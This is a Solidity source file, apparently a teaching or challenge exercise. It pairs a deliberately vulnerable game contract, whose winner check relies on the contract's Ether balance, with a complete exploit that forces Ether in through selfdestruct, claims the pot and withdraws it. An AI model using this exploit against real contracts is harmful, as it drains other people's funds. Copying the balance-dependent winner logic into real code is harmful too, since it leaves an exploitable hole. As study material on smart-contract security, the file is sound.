// SPDX-License-Identifier: MIT
pragma solidity =0.8.20;

/// This contract is designed to potentially prevent any degen from winning the game

contract DegenGame {
    uint public targetAmount = 11 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");
        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");
        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");
        winner = address(0);
        (bool sent, ) = payable(msg.sender).call{value: address(this).balance}(
            ""
        );
        require(sent, "Failed to send Ether");
    }
}

contract Feeder {
    constructor(address payable _DegenGame) payable {
        selfdestruct(_DegenGame);
    }
}

contract AttackForWin {
    DegenGame public degenGame;
    address public owner;

    constructor(address payable _DegenGame) {
        degenGame = DegenGame(_DegenGame);
        owner = msg.sender;
    }

    function requiredValue() public view returns (uint256) {
        uint256 gameBalance = address(degenGame).balance;
        uint256 targetAmount = degenGame.targetAmount();
        uint256 missingAmount = targetAmount - gameBalance;
        return missingAmount;
    }

    function attack() public payable {
        uint256 missingAmount = requiredValue();
        uint256 moveAmount = 1 ether;
        require(msg.value == missingAmount, "Not enough value");
        // Leave 1 ether to call deposit and become a winner
        new Feeder{value: missingAmount - moveAmount}(
            payable(address(degenGame))
        );
        degenGame.deposit{value: moveAmount}();
        degenGame.claimReward();
    }

    function withdraw() public {
        require(msg.sender == owner, "Not owner");
        (bool sent, ) = payable(owner).call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {}
}
